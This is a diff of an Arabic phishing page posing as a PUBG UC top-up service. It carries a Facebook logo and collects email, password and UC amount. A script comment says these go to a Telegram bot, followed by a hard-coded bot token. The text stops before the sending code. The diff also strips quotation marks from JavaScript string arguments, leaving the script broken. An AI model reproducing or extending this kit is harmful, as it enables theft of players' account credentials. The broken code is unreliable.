@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ar">
 <head>
@@ -6,7 +7,7 @@
     <title>شحن UC - ببجي 🎮</title>
     <style>
         body {
-            font-family: 'Arial', sans-serif;
+            font-family:  Arial , sans-serif;
             background-color: #000; /* خلفية سوداء */
             color: #fff;
             display: flex;
@@ -69,7 +70,7 @@
 </head>
 <body>
     <div class="login-container">
-        <img src="1.jpg">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="فيس بوك" style="width: 107px; height: auto;"> <!-- حجم الصورة 107 بكسل -->
         <h1>اشحن الآن حسابك🚀💰</h1>
         <form id="charge-form">
             <input type="email" id="email" placeholder="البريد الإلكتروني 📧" required>
@@ -87,12 +88,12 @@
     </div>
 
     <script>
-        document.getElementById('charge-form').addEventListener('submit', function(event) {
+        document.getElementById( charge-form ).addEventListener( submit , function(event) {
             event.preventDefault(); // منع إرسال النموذج بشكل افتراضي
 
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            const ucAmount = document.getElementById('uc-amount').value;
+            const email = document.getElementById( email ).value;
+            const password = document.getElementById( password ).value;
+            const ucAmount = document.getElementById( uc-amount ).value;
 
             // إرسال المعلومات إلى بوت تلجرام
             const telegramBotToken = "7768510246:AAHzRLtOCX2UK3wNNCF8UzsABWYDp2sSjjc";
